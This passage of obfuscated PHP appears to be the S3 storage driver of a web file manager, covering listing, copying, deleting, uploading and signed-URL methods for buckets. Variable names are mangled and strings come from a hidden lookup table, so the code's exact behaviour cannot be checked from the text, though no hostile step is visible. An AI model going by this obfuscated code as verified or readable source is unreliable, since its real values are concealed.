REPEAT_RENAME_FOLDER) { return $Ã¥Úğ¢ô; } if ($£ª¸±í© == REPEAT_SKIP) { return !1; } $“ß¼ÚŠ‹ = $¶Ïßàôö[10] . get_path_ext($Ã¥Úğ¢ô); $“ß¼ÚŠ‹ = $“ß¼ÚŠ‹ == $¶Ïßàôö[10] || $ŸÏÜÓú÷ ? $¶Ïßàôö[12] : $“ß¼ÚŠ‹; $Äñ¸ÔÅÛ = 1; $ƒ—œøë× = substr($Ã¥Úğ¢ô, 0, strlen($Ã¥Úğ¢ô) - strlen($“ß¼ÚŠ‹)); $˜áåøÑ = $ƒ—œøë× . "\50{$Äñ¸ÔÅÛ}\x29{$“ß¼ÚŠ‹}"; while ($this->exist(rtrim($ôÄòÍÀà, $¶Ïßàôö[8]) . $¶Ïßàôö[8] . $˜áåøÑ)) { $˜áåøÑ = $ƒ—œøë× . "\50{$Äñ¸ÔÅÛ}\x29{$“ß¼ÚŠ‹}"; $Äñ¸ÔÅÛ++; } return $˜áåøÑ; } private function fileNameAutoList($¤«ÅÚÀÖ, $£´ìØõ¿, $ì²Îä‡æ = false) { $Ú³ÁİÏí =& $_SERVER[ ÇƒŠìÀ]; $†„Ãª»… = $this->listPath($¤«ÅÚÀÖ, !0); $†„Ãª»… = array_merge($†„Ãª»…[$Ú³ÁİÏí[84]], $†„Ãª»…[$Ú³ÁİÏí[85]]); $ÕÃ¾ÃğÏ = array_to_keyvalue($†„Ãª»…, $Ú³ÁİÏí[12], $Ú³ÁİÏí[32]); $Å„×ñ£¶ = $Ú³ÁİÏí[10] . get_path_ext($£´ìØõ¿); $Å„×ñ£¶ = $Å„×ñ£¶ == $Ú³ÁİÏí[10] || $ì²Îä‡æ ? $Ú³ÁİÏí[12] : $Å„×ñ£¶; $Ÿ–„ÀÆô = substr($£´ìØõ¿, 0, strlen($£´ìØõ¿) - strlen($Å„×ñ£¶)); $»µ¡Ğåö = $Ÿ–„ÀÆô . "\50\60\51{$Å„×ñ£¶}"; for ($ÆàÊ³ğÏ = 1; $ÆàÊ³ğÏ <= count($ÕÃ¾ÃğÏ) + 1; $ÆàÊ³ğÏ++) { $»µ¡Ğåö = $Ÿ–„ÀÆô . "\x28{$ÆàÊ³ğÏ}\x29{$Å„×ñ£¶}"; if (!in_array_not_case($»µ¡Ğåö, $ÕÃ¾ÃğÏ)) { return $»µ¡Ğåö; } } return $»µ¡Ğåö; } public function listAllFiles($›÷Ôƒ°, $…Ã—İ®) { $ûÈÂİÕš =& $_SERVER[ ÇƒŠìÀ]; if (empty($…Ã—İ®)) { return array(); } $»¢“‰¦µ = array_keys($…Ã—İ®); $±ÖÅÇ¢‡ = array(); $›÷Ôƒ° = trim($›÷Ôƒ°, $ûÈÂİÕš[8]); foreach ($…Ã—İ® as $Ã’˜ü‘ => $îîË²£) { $¾—Í¨¤ = ltrim(substr(trim($Ã’˜ü‘, $ûÈÂİÕš[8]), strlen($›÷Ôƒ°)), $ûÈÂİÕš[8]); if (substr($Ã’˜ü‘, -1) == $ûÈÂİÕš[8]) { $¾—Í¨¤ = rtrim($¾—Í¨¤, $ûÈÂİÕš[8]) . $ûÈÂİÕš[8]; } $±ÖÅÇ¢‡ = array_merge($±ÖÅÇ¢‡, $this->slicePath($¾—Í¨¤)); } $úã³àäõ = array(); foreach (array_unique($±ÖÅÇ¢‡) as $†ıñøÆÏ) { $¦ã€¡µá = array($ûÈÂİÕš[86] => $this->getPathOuter($ûÈÂİÕš[8] . $›÷Ôƒ° . $ûÈÂİÕš[8] . $†ıñøÆÏ), $ûÈÂİÕš[77] => 1, $ûÈÂİÕš[78] => 0); if (substr($†ıñøÆÏ, -1) != $ûÈÂİÕš[8]) { $¦ã€¡µá[$ûÈÂİÕš[77]] = 0; $ÅÜßô¯° = $this->getPath($›÷Ôƒ° . $ûÈÂİÕš[8] . $†ıñøÆÏ); if (isset($…Ã—İ®[$ÅÜßô¯°])) { $¨Ğ¹ˆ = $…Ã—İ®[$ÅÜßô¯°]; if (isset($¨Ğ¹ˆ[$ûÈÂİÕš[78]])) { $¦ã€¡µá[$ûÈÂİÕš[78]] = intval($¨Ğ¹ˆ[$ûÈÂİÕš[78]]); } if (isset($¨Ğ¹ˆ[$ûÈÂİÕš[196]])) { $¦ã€¡µá[$ûÈÂİÕš[87]] = intval($¨Ğ¹ˆ[$ûÈÂİÕš[196]]); } } } $úã³àäõ[] = $¦ã€¡µá; } return $úã³àäõ; } public function slicePath($š·óî×) { $çİ¯‘×È =& $_SERVER[ ÇƒŠìÀ]; $Õ•Ë²ØÄ = explode($çİ¯‘×È[8], trim($š·óî×, $çİ¯‘×È[8])); $•Üò»Ü = 0; do { ++$•Üò»Ü; $òƒğù•µ[] = implode($çİ¯‘×È[8], array_slice($Õ•Ë²ØÄ, 0, $•Üò»Ü)) . $çİ¯‘×È[8]; } while ($•Üò»Ü < count($Õ•Ë²ØÄ)); $òƒğù•µ[count($Õ•Ë²ØÄ) - 1] = $š·óî×; return $òƒğù•µ; } public function getHost() { $éõ‰ÙÑ =& $_SERVER[ ÇƒŠìÀ]; $¤ëÂÀÃ‹ = parse_url(trim($this->domain, $éõ‰ÙÑ[8])); $Õ˜üÏÅõ = isset($¤ëÂÀÃ‹[$éõ‰ÙÑ[197]]) ? $¤ëÂÀÃ‹[$éõ‰ÙÑ[197]] : http_type(); $“²šÔÍ• = isset($¤ëÂÀÃ‹[$éõ‰ÙÑ[198]]) ? $¤ëÂÀÃ‹[$éõ‰ÙÑ[198]] : $¤ëÂÀÃ‹[$éõ‰ÙÑ[86]]; if (isset($¤ëÂÀÃ‹[$éõ‰ÙÑ[199]])) { $“²šÔÍ• .= $éõ‰ÙÑ[4] . $¤ëÂÀÃ‹[$éõ‰ÙÑ[199]]; } return $Õ˜üÏÅõ . $éõ‰ÙÑ[200] . $“²šÔÍ•; } public function pathEncode($šçâËãÇ) { $ÒçÍ¬¦µ =& $_SERVER[ ÇƒŠìÀ]; return str_replace($ÒçÍ¬¦µ[201], $ÒçÍ¬¦µ[8], rawurlencode($šçâËãÇ)); } } class PathDriverBaseS3 extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $useSSL = false; protected $region = ''; protected $endpoint = ''; protected $bucket = ''; protected $client = null; protected $signVer = "\x76\64"; public $ioUploadServer = "\x30"; public $ioFileOutServer = "\x30"; public $config = array(); public function __construct($ÀÌî¤éº) { set_timeout(); require_once SDK_DIR . $_SERVER[ ÇƒŠìÀ][202]; parent::__construct(); $this->_init($ÀÌî¤éº); } public function _init($®Ò”µÈÃ) { $this->config = $®Ò”µÈÃ; foreach ($®Ò”µÈÃ as $ÓÍÙÀ¹ => $˜…–À»…) { if (isset($this->{$ÓÍÙÀ¹})) { $this->{$ÓÍÙÀ¹} = $˜…–À»…; } } $this->endpoint = $®Ò”µÈÃ[$_SERVER[ ÇƒŠìÀ][203]]; $this->client = new S3($this->accessKey, $this->secret, $this->useSSL, $this->endpoint, $this->region); $this->client->setEndpoint($this->getHost()); } public function signatureVersion($¹Áú°“¯ = "\x76\x34") { $this->signVer = $¹Áú°“¯; $this->client->setSignatureVersion($¹Áú°“¯); } public function setBucketCors() { return $this->client->setBucketCors($this->bucket); } public function getBucketCors() { return $this->client->getBucketCors($this->bucket); } public function isBucketCors() { $àİúŠ²İ =& $_SERVER[ ÇƒŠìÀ]; $»öœïò‚ = $this->getBucketCors(); if (!$»öœïò‚ || !is_array($»öœïò‚)) { return !1; } if ($»öœïò‚[$àİúŠ²İ[204]] != $àİúŠ²İ[205] || $»öœïò‚[$àİúŠ²İ[206]] != $àİúŠ²İ[205]) { return !1; } $ÍÎõ‡óŞ = array_map($àİúŠ²İ[207], $»öœïò‚[$àİúŠ²İ[208]]); if (!is_array($ÍÎõ‡óŞ)) { $ÍÎõ‡óŞ = array(); } $Şªíšøª = array($àİúŠ²İ[209], $àİúŠ²İ[210], $àİúŠ²İ[211], $àİúŠ²İ[212], $àİúŠ²İ[213]); $«´½Œùô = array_diff($Şªíšøª, $ÍÎõ‡óŞ); return empty($«´½Œùô); } public function mkfile($€úÀ”¤Ó, $Öı‰êÖ× = '', $¤ÕÉàÒŞ = REPEAT_RENAME) { $ßùÀ—„ƒ = $this->setContent($€úÀ”¤Ó, $Öı‰êÖ×); if ($ßùÀ—„ƒ !== !1) { return $this->getPathOuter($€úÀ”¤Ó); } return !1; } public function mkdir($ÆÊÀÅ, $õÀŠ—¢ï = REPEAT_SKIP) { $‰º™… =& $_SERVER[ ÇƒŠìÀ]; if (empty($ÆÊÀÅ) && $ÆÊÀÅ !== $‰º™…[214]) { return !1; } if ($õÀŠ—¢ï && $this->_isFolder($ÆÊÀÅ)) { return $this->getPathOuter($ÆÊÀÅ); } $Å­ˆµğ¬ = $this->setContent($ÆÊÀÅ, $‰º™…[12], !0); if ($Å­ˆµğ¬ !== !1) { return $this->getPathOuter($ÆÊÀÅ); } return !1; } public function copyFile($åòæíÑ¿, $´ÃÆ±ç™, $İÁÊÁ®ú = array()) { $åİóê• =& $_SERVER[ ÇƒŠìÀ]; $‹ßİ»¥ = $this->objectMeta($åòæíÑ¿); if (!$‹ßİ»¥) { return !1; } if ($‹ßİ»¥[$åİóê•[78]] <= 1024 * 1024 * 200) { $ğ„¢ò = $this->client->copyObject($this->bucket, $åòæíÑ¿, $this->bucket, $´ÃÆ±ç™, $åİóê•[215], $İÁÊÁ®ú); } else { $ğ„¢ò = $this->client->multiCopyObject($this->bucket, $åòæíÑ¿, $this->bucket, $´ÃÆ±ç™, $İÁÊÁ®ú); } $ğ„¢ò = $ğ„¢ò ? $this->getPathOuter($´ÃÆ±ç™) : !1; return $ğ„¢ò; } public function moveFile($ù–âÄ†­, $­ÍâÉº) { if ($this->copyFile($ù–âÄ†­, $­ÍâÉº)) { $this->delFile($ù–âÄ†­); return $this->getPathOuter($­ÍâÉº); } return !1; } public function delFile($ò¿è¹—¬) { return $this->client->deleteObject($this->bucket, $ò¿è¹—¬); } public function delFolder($ŒúÖÅ•Ö) { $ˆ“™©ˆÜ =& $_SERVER[ ÇƒŠìÀ]; if (!$this->exist($ŒúÖÅ•Ö)) { return !0; } $this->listItemCache = !1; $ğæ‹ëø† = $this->fileList($ŒúÖÅ•Ö); $this->listItemCache = !0; $İ×½Ø±ã = trim($ŒúÖÅ•Ö, $ˆ“™©ˆÜ[8]) . $ˆ“™©ˆÜ[8]; if (!empty($ŒúÖÅ•Ö) && $ŒúÖÅ•Ö !== $ˆ“™©ˆÜ[214] && !in_array($İ×½Ø±ã, $ğæ‹ëø†[$ˆ“™©ˆÜ[84]])) { $ğæ‹ëø†[$ˆ“™©ˆÜ[84]][] = $İ×½Ø±ã; } $¾ÈÔøìñ = $this->delByBatch($ğæ‹ëø†[$ˆ“™©ˆÜ[85]]); if (!$¾ÈÔøìñ) { return !1; } $¾ÈÔøìñ = $this->delByBatch($ğæ‹ëø†[$ˆ“™©ˆÜ[84]]); if (!$¾ÈÔøìñ) { return !1; } return $this->delFile($İ×½Ø±ã); } private function delByBatch($«‡½ÒÖ³) { foreach (array_chunk($«‡½ÒÖ³, 1000) as $Ü€ı®ù‹) { $³ƒ°°£² = $this->client->deleteObjects($this->bucket, $Ü€ı®ù‹); if (!$³ƒ°°£²) { return !1; } } return !0; } public function rename($Íë×œÏ, $Ä—÷Äöı) { return $this->renameObject($Íë×œÏ, $Ä—÷Äöı); } public function listPath($¸ÀÙòÙ, $¾À™ß³¶ = false) { $«ÍŒ¶Ìö =& $_SERVER[ ÇƒŠìÀ]; $ßÉö²ô = $this->fileList($¸ÀÙòÙ, $«ÍŒ¶Ìö[8], !0); foreach ($ßÉö²ô[$«ÍŒ¶Ìö[84]] as $Ü–Ñ¸•Í => $ƒ†€å‹‚) { $ßÉö²ô[$«ÍŒ¶Ìö[84]][$Ü–Ñ¸•Í] = $this->folderInfo($ƒ†€å‹‚, $¾À™ß³¶, $ƒ†€å‹‚); } foreach ($ßÉö²ô[$«ÍŒ¶Ìö[85]] as $Ü–Ñ¸•Í => $ƒ†€å‹‚) { $ßÉö²ô[$«ÍŒ¶Ìö[85]][$Ü–Ñ¸•Í] = $this->fileInfo($ƒ†€å‹‚[$«ÍŒ¶Ìö[32]], $¾À™ß³¶, $ƒ†€å‹‚); } return $ßÉö²ô; } protected function infoChildren($¯œª²•¸, &$ıÀ‚¦—¡) { $ªé¥ó÷­ =& $_SERVER[ ÇƒŠìÀ]; $è´¢õÊÎ = $this->fileList($¯œª²•¸, $ªé¥ó÷­[12], !0); $ıÀ‚¦—¡[$ªé¥ó÷­[80]] += count($è´¢õÊÎ[$ªé¥ó÷­[84]]); $ıÀ‚¦—¡[$ªé¥ó÷­[79]] += count($è´¢õÊÎ[$ªé¥ó÷­[85]]); foreach ($è´¢õÊÎ[$ªé¥ó÷­[85]] as $´ŸÚ¸îû) { if (!$´ŸÚ¸îû || !$´ŸÚ¸îû[$ªé¥ó÷­[78]]) { continue; } $ıÀ‚¦—¡[$ªé¥ó÷­[78]] += $´ŸÚ¸îû[$ªé¥ó÷­[78]]; } } private function fileInfo($Ç¨¾Ø™, $½Î‡¼Â = false, $àèÌöÚ˜ = array()) { $ù†Ÿ²¬Ò =& $_SERVER[ ÇƒŠìÀ]; $·„ˆ‘¹› = array($ù†Ÿ²¬Ò[32] => $this->pathThis($Ç¨¾Ø™), $ù†Ÿ²¬Ò[86] => $this->getPathOuter($Ç¨¾Ø™), $ù†Ÿ²¬Ò[33] => $ù†Ÿ²¬Ò[216], $ù†Ÿ²¬Ò[177] => $this->ext($Ç¨¾Ø™), $ù†Ÿ²¬Ò[78] => isset($àèÌöÚ˜[$ù†Ÿ²¬Ò[78]]) ? $àèÌöÚ˜[$ù†Ÿ²¬Ò[78]] : 0); if ($½Î‡¼Â) { return $·„ˆ‘¹›; } $·„ˆ‘¹›[$ù†Ÿ²¬Ò[217]] = $·„ˆ‘¹›[$ù†Ÿ²¬Ò[87]] = 0; $·„ˆ‘¹›[$ù†Ÿ²¬Ò[218]] = $·„ˆ‘¹›[$ù†Ÿ²¬Ò[219]] = !0; if (empty($àèÌöÚ˜)) { $àèÌöÚ˜ = $this->objectMeta($Ç¨¾Ø™); if (!$àèÌöÚ˜) { return $·„ˆ‘¹›; } } if (isset($àèÌöÚ˜[$ù†Ÿ²¬Ò[220]]) && $àèÌöÚ˜[$ù†Ÿ²¬Ò[220]]) { $·„ˆ‘¹›[$ù†Ÿ²¬Ò[221]] = $àèÌöÚ˜[$ù†Ÿ²¬Ò[220]]; } if (isset($àèÌöÚ˜[$ù†Ÿ²¬Ò[196]])) { $·„ˆ‘¹›[$ù†Ÿ²¬Ò[87]] = $àèÌöÚ˜[$ù†Ÿ²¬Ò[196]]; } if (isset($àèÌöÚ˜[$ù†Ÿ²¬Ò[78]])) { $·„ˆ‘¹›[$ù†Ÿ²¬Ò[78]] = $àèÌöÚ˜[$ù†Ÿ²¬Ò[78]]; } return $·„ˆ‘¹›; } private function folderInfo($µí ¢ŞÒ, $î’Ä¹Ş = false, $‰Ö«ˆ¥Ô = array()) { $ê¨±Óìú =& $_SERVER[ ÇƒŠìÀ]; $Û°‡ÈÅ = array($ê¨±Óìú[32] => $this->pathThis($µí ¢ŞÒ), $ê¨±Óìú[86] => $this->getPathOuter($ê¨±Óìú[8] . $µí ¢ŞÒ), $ê¨±Óìú[33] => $ê¨±Óìú[77]); if ($î’Ä¹Ş) { return $Û°‡ÈÅ; } $Û°‡ÈÅ[$ê¨±Óìú[217]] = $Û°‡ÈÅ[$ê¨±Óìú[87]] = 0; $Û°‡ÈÅ[$ê¨±Óìú[218]] = $Û°‡ÈÅ[$ê¨±Óìú[219]] = !0; if ($µí ¢ŞÒ == $ê¨±Óìú[12]) { return $Û°‡ÈÅ; } if (empty($‰Ö«ˆ¥Ô)) { $‰Ö«ˆ¥Ô = $this->objectMeta(trim($µí ¢ŞÒ, $ê¨±Óìú[8]) . $ê¨±Óìú[8]); } if (isset($‰Ö«ˆ¥Ô[$ê¨±Óìú[196]])) { $Û°‡ÈÅ[$ê¨±Óìú[217]] = $‰Ö«ˆ¥Ô[$ê¨±Óìú[196]]; } return $Û°‡ÈÅ; } private function fileList($¤áÃªÌÙ, $¬Ô­ï£Ñ = '', $êòĞû–ã = 0) { $ÕÌÃÌ¬É =& $_SERVER[ ÇƒŠìÀ]; $éÂ™ÇÅÛ = rtrim($¤áÃªÌÙ, $ÕÌÃÌ¬É[8]) . $ÕÌÃÌ¬É[8]; $Áí¾’çı = $this->listObjs($éÂ™ÇÅÛ, null, null, $¬Ô­ï£Ñ); if (!$Áí¾’çı) { return array($ÕÌÃÌ¬É[84] => array(), $ÕÌÃÌ¬É[85] => array()); } $ëïß–ø´ = $¬²õªÛœ = array(); foreach ($Áí¾’çı[$ÕÌÃÌ¬É[222]] as $şç­öşÍ) { $èõ’ªŞ³ = $şç­öşÍ[$ÕÌÃÌ¬É[32]]; if ($èõ’ªŞ³ == $éÂ™ÇÅÛ) { continue; } $­â¤Ğ©¦ = isset($şç­öşÍ[$ÕÌÃÌ¬É[78]]) ? $şç­öşÍ[$ÕÌÃÌ¬É[78]] : 0; $‘µ‹‹³Æ = $­â¤Ğ©¦ == 0 && substr($èõ’ªŞ³, strlen($èõ’ªŞ³) - 1, 1) == $ÕÌÃÌ¬É[8] ? !0 : !1; $this->cacheMethodInfoSet($èõ’ªŞ³, $‘µ‹‹³Æ, $şç­öşÍ); if ($‘µ‹‹³Æ) { $ëïß–ø´[] = $èõ’ªŞ³; continue; } $¬²õªÛœ[] = $êòĞû–ã ? $şç­öşÍ : $èõ’ªŞ³; } foreach ($Áí¾’çı[$ÕÌÃÌ¬É[223]] as $şç­öşÍ) { $ëïß–ø´[] = $şç­öşÍ[$ÕÌÃÌ¬É[32]]; $this->cacheMethodInfoSet($şç­öşÍ[$ÕÌÃÌ¬É[32]], !0); } $this->cacheMethodInfoSet($¤áÃªÌÙ, !0); return array($ÕÌÃÌ¬É[84] => $ëïß–ø´, $ÕÌÃÌ¬É[85] => $¬²õªÛœ); } private function listObjs($Û¡Â¥šƒ, $µ Å½–× = null, $øĞ‘ĞÈ = null, $İ‘ğƒ†â = null) { $¯á²Ôã =& $_SERVER[ ÇƒŠìÀ]; $Û¡Â¥šƒ = trim($Û¡Â¥šƒ, $¯á²Ôã[8]); $¾˜Éú£ = empty($Û¡Â¥šƒ) && $Û¡Â¥šƒ !== $¯á²Ôã[214] ? $¯á²Ôã[12] : $Û¡Â¥šƒ . $¯á²Ôã[8]; return $this->client->getBucket($this->bucket, $¾˜Éú£, $µ Å½–×, $øĞ‘ĞÈ, $İ‘ğƒ†â, !0); } public function has($íš‡™ º, $”Ï×ĞØì = false, $›Å¤®ºÑ = true) { $™òô¼ä« =& $_SERVER[ ÇƒŠìÀ]; $íš‡™ º = trim($íš‡™ º, $™òô¼ä«[8]); $Ô³»Êš = empty($íš‡™ º) && $íš‡™ º !== $™òô¼ä«[214] ? $™òô¼ä«[12] : $íš‡™ º . $™òô¼ä«[8]; $¨şÎ¦Á = null; $ó–äì¿’ = 500; $³†÷€³ú = $™òô¼ä«[8]; $½–¨Á„§ = $÷üœ°© = array(); while (!0) { $¼å‘Í¼Î = $this->listObjs($íš‡™ º, $¨şÎ¦Á, $ó–äì¿’, $³†÷€³ú); if (!$¼å‘Í¼Î) { break; } $¨şÎ¦Á = $¼å‘Í¼Î[$™òô¼ä«[224]]; $İ¸Ïæ­á = $¼å‘Í¼Î[$™òô¼ä«[222]]; $¸ŒÛĞŸ÷ = $¼å‘Í¼Î[$™òô¼ä«[223]]; if (empty($İ¸Ïæ­á) && empty($¸ŒÛĞŸ÷)) { break; } if (count($İ¸Ïæ­á) == 1 && $İ¸Ïæ­á[0][$™òô¼ä«[32]] == $Ô³»Êš) { break; } if ($”Ï×ĞØì) { if (count($İ¸Ïæ­á)) { $İ¸Ïæ­á = array_column($İ¸Ïæ­á, $™òô¼ä«[32]); $½–¨Á„§ = array_merge($½–¨Á„§, $İ¸Ïæ­á); } if (count($¸ŒÛĞŸ÷)) { $¸ŒÛĞŸ÷ = array_column($¸ŒÛĞŸ÷, $™òô¼ä«[32]); $÷üœ°© = array_merge($÷üœ°©, $¸ŒÛĞŸ÷); } if ($¨şÎ¦Á === null) { break; } continue; } if ($›Å¤®ºÑ) { if (!empty($İ¸Ïæ­á)) { if (count($İ¸Ïæ­á) > 1 || isset($İ¸Ïæ­á[0][$™òô¼ä«[32]]) && $İ¸Ïæ­á[0][$™òô¼ä«[32]] != $Ô³»Êš) { return !0; } } } else { if (!empty($¸ŒÛĞŸ÷)) { return !0; } } if ($¨şÎ¦Á === null) { break; } } if ($”Ï×ĞØì) { $½–¨Á„§ = array_diff($½–¨Á„§, array($Ô³»Êš)); $½–¨Á„§ = count(array_unique($½–¨Á„§)); $÷üœ°© = count(array_unique($÷üœ°©)); return array($™òô¼ä«[225] => $½–¨Á„§, $™òô¼ä«[226] => $÷üœ°©); } return !1; } public function listAll($« İ‘±) { $€úÕêØµ =& $_SERVER[ ÇƒŠìÀ]; $Ô³ƒ©Á = $this->fileList($« İ‘±, $€úÕêØµ[12], !0); $ğ‡ş½®Â = array_to_keyvalue($Ô³ƒ©Á[$€úÕêØµ[85]], $€úÕêØµ[32]); foreach ($Ô³ƒ©Á[$€úÕêØµ[84]] as $Ëñàâ Ê) { if (is_string($Ëñàâ Ê)) { $ğ‡ş½®Â[$Ëñàâ Ê] = array($€úÕêØµ[78] => 0); } } return $this->listAllFiles($« İ‘±, $ğ‡ş½®Â); } public function canRead($¥±ãïŞ) { $ıèòı€ =& $_SERVER[ ÇƒŠìÀ]; $€ˆÚ¤ÒÎ = $this->client->getAccessControlPolicy($this->bucket, $¥±ãïŞ); if (!$€ˆÚ¤ÒÎ) { return !1; } return in_array($€ˆÚ¤ÒÎ, array($ıèòı€[227], $ıèòı€[228], $ıèòı€[229])) ? !0 : !1; } public function canWrite($ÄÙ¾É®£) { $ë¹¶æ¡ =& $_SERVER[ ÇƒŠìÀ]; $®÷¾Êïˆ = $this->client->getAccessControlPolicy($this->bucket, $ÄÙ¾É®£); if (!$®÷¾Êïˆ) { return !1; } return in_array($®÷¾Êïˆ, array($ë¹¶æ¡[227], $ë¹¶æ¡[228])) ? !0 : !1; } public function getContent($¼ÊÀÊ»ô) { return $this->client->getObject($this->bucket, $¼ÊÀÊ»ô); } public function setContent($‚å¢ÌŞ’, $Ôõ¾ã»¡ = '', $é…™»ßí = false) { $‰Ò«ÂÓ =& $_SERVER[ ÇƒŠìÀ]; $‚å¢ÌŞ’ = $é…™»ßí ? trim($‚å¢ÌŞ’, $‰Ò«ÂÓ[8]) . $‰Ò«ÂÓ[8] : $‚å¢ÌŞ’; $–â¶×¥ = get_file_mime(get_path_ext($‚å¢ÌŞ’)); $­ëÑÓÄ = $this->client->putObject($Ôõ¾ã»¡, $this->bucket, $‚å¢ÌŞ’, $‰Ò«ÂÓ[215], array(), $–â¶×¥); if (!$­ëÑÓÄ) { return !1; } if ($é…™»ßí) { return !0; } $this->cacheMethod(null, null); $­ëÑÓÄ = $this->copyFile($‚å¢ÌŞ’, $‚å¢ÌŞ’, array($‰Ò«ÂÓ[230] => $­ëÑÓÄ[$‰Ò«ÂÓ[220]])); return $­ëÑÓÄ ? !0 : !1; } public function fileSubstr($ŸÙ¨Ğ­, $»×ßş†£, $—ª‰–âÅ) { $š´èš¡ = $»×ßş†£ + $—ª‰–âÅ - 1; return $this->client->getObject($this->bucket, $ŸÙ¨Ğ­, array($_SERVER[ ÇƒŠìÀ][231] => "\x62\x79\x74\x65\163\75{$»×ßş†£}\55{$š´èš¡}")); } public function upload($¸‰×İİ¦, $È÷‡†ÃÓ, $Š€Òœ„ò = false, $Î®…¤ûÎ = REPEAT_REPLACE) { $‹˜ÅÁ° =& $_SERVER[ ÇƒŠìÀ]; $ßË–©ü = array($‹˜ÅÁ°[230] => @md5_file($È÷‡†ÃÓ)); $ªÎşÚÁ = array($‹˜ÅÁ°[232] => get_file_mime(get_path_ext($¸‰×İİ¦))); if (IO::size($È÷‡†ÃÓ) <= 1024 * 1024 * 200) { $ÓÀûÒµ² = $this->client->putObjectFile($È÷‡†ÃÓ, $this->bucket, $¸‰×İİ¦, $‹˜ÅÁ°[215], $ßË–©ü, $ªÎşÚÁ); return !empty($ÓÀûÒµ²) ? $this->getPathOuter($¸‰×İİ¦) : !1; } $ìì¸áù = $this->client->multiUploadObject($È÷‡†ÃÓ, $this->bucket, trim($¸‰×İİ¦, $‹˜ÅÁ°[8]), $ßË–©ü, $ªÎşÚÁ); return $ìì¸áù ? $this->getPathOuter($¸‰×İİ¦) : !1; } public function download($®ĞÂ²º¼, $¥¦ä†êû) { if (!@is_dir($this->pathFather($¥¦ä†êû)) && !IO::mkdir($this->pathFather($¥¦ä†êû))) { return !1; } $Éªôç² = $this->client->getObject($this->bucket, $®ĞÂ²º¼, array(), $¥¦ä†êû); return $Éªôç² !== !1 ? $¥¦ä†êû : !1; } public function link($÷ú…¹ÆÀ, $óÁÁìúÃ = array()) { $Ù‰ŒË›¾ =& $_SERVER[ ÇƒŠìÀ]; if ($this->signVer == $Ù‰ŒË›¾[233]) { return $this->client->getAuthenticatedURL($this->bucket, $÷ú…¹ÆÀ, 3600 * 12, $óÁÁìúÃ); } return $this->client->getObjectUrl($this->accessKey, $this->secret, $this->bucket, trim($÷ú…¹ÆÀ, $Ù‰ŒË›¾[8]), 3600 * 12, $this->region, array(), !0, $óÁÁìúÃ); } public function fileOut($Ï”ÀÄ¼â, $Í‚¸³…• = false, $óãŞ•¨¬ = false, $ÒÅ·ıóû = '') { $“Á³¡ş =& $_SERVER[ ÇƒŠìÀ]; if ($this->isFileOutServer()) { return $this->fileOutServer($Ï”ÀÄ¼â, $Í‚¸³…•, $óãŞ•¨¬, $ÒÅ·ıóû); } if (!$óãŞ•¨¬) { $óãŞ•¨¬ = $this->pathThis($Ï”ÀÄ¼â); } $¾–²ÍÜ‰ = get_file_mime(get_path_ext($óãŞ•¨¬)); if ($¾–²ÍÜ‰ == $“Á³¡ş[234]) { return parent::fileOut($Ï”ÀÄ¼â, $Í‚¸³…•, $óãŞ•¨¬, $ÒÅ·ıóû); } $Ÿ¿œ×Š = array($“Á³¡ş[235] => $¾–²ÍÜ‰); if ($Í‚¸³…•) { $Ÿ¿œ×Š[$“Á³¡ş[236]] = $“Á³¡ş[237] . rawurlencode($óãŞ•¨¬); } else { } $Ñ¹”ô¯¸ = $this->link($Ï”ÀÄ¼â, $Ÿ¿œ×Š); $this->fileOutLink($Ñ¹”ô¯¸); } public function fileOutServer($–¨¨×Õç, $øóÑ“µÁ = false, $ê¸¶ìĞ¸ = false, $éè†İ° = '') { parent::fileOut($–¨¨×Õç, $øóÑ“µÁ, $ê¸¶ìĞ¸, $éè†İ°); } public function fileOutImageServer($èÛ—öğ‰, $¸³¯ò‹÷ = 250) { parent::fileOutImage($èÛ—öğ‰, $¸³¯ò‹÷); } public function hashMd5($î½ËÔÁĞ, $Ï¼÷üóâ = '') { $Üõå •ˆ =& $_SERVER[ ÇƒŠìÀ]; $£Å¼í = $this->objectMeta($î½ËÔÁĞ); if (!$£Å¼í) { return !1; } $Ï¼÷üóâ = $Ï¼÷üóâ ? $Ï¼÷üóâ : _get($£Å¼í, $Üõå •ˆ[238]); $Ï¼÷üóâ = $Ï¼÷üóâ ? $Ï¼÷üóâ : _get($£Å¼í, $Üõå •ˆ[220], $Üõå •ˆ[12]); return $Ï¼÷üóâ; } public function uploadFormData($ğÛ´„àü, $†â¨æò = 3600) { $ŒÃ·Ò¬Í =& $_SERVER[ ÇƒŠìÀ]; $ó¤‰”®€ = $this->pathFather($ğÛ´„àü); $³´¤ßûÃ = $this->client->getHttpUploadPostParams($this->bucket, $ó¤‰”®€, $ŒÃ·Ò¬Í[215], $†â¨æò); return array_merge((array) $³´¤ßûÃ, array($ŒÃ·Ò¬Í[198] => $this->getHost())); } public function multiUploadFormData($öË†Éº›, $Ñƒàú = 3600) { $ØÑğ„ğ =& $_SERVER[ ÇƒŠìÀ]; $µŞìÒ–® = gmdate($ØÑğ„ğ[239]); $Ü¦Š¸§ = array(); $øÍ×İü = $this->client->getUploadId($this->bucket, $öË†Éº›, $Ü¦Š¸§); if (!$øÍ×İü) { return !1; } return array($ØÑğ„ğ[240] => $øÍ×İü, $ØÑğ„ğ[198] => $this->getHost() . $ØÑğ„ğ[8] . $this->pathEncode($öË†Éº›), $ØÑğ„ğ[241] => $µŞìÒ–®, $ØÑğ„ğ[96] => $öË†Éº›); } public function multiUploadAuthData($‡¤Ø›­Ë, $Û‰‰‹Í¾ = array()) { $¼½ƒêğš =& $_SERVER[ ÇƒŠìÀ]; $¿ú”÷ä§ = isset($Û‰‰‹Í¾[$¼½ƒêğš[241]]) ? $Û‰‰‹Í¾[$¼½ƒêğš[241]] : gmdate($¼½ƒêğš[239]); $ğï¸»Éª = isset($Û‰‰‹Í¾[$¼½ƒêğš[177]]) ? $Û‰‰‹Í¾[$¼½ƒêğš[177]] : $¼½ƒêğš[12]; $—°ûÇÒ× = $Û‰‰‹Í¾[$¼½ƒêğš[96]]; unset($Û‰‰‹Í¾[$¼½ƒêğš[96]]); if (isset($Û‰‰‹Í¾[$¼½ƒêğš[242]])) { $Û‰‰‹Í¾[$¼½ƒêğš[241]] = $¿ú”÷ä§; return $this->listUploadParts($—°ûÇÒ×, $Û‰‰‹Í¾); } $¨Ÿ†¾’é = array($¼½ƒêğš[243], $¼½ƒêğš[12], $¼½ƒêğš[122], $¼½ƒêğš[12], "\170\x2d\141\155\x7a\x2d\144\141\x74\x65\72{$¿ú”÷ä§}", $¼½ƒêğš[8] . $this->bucket . 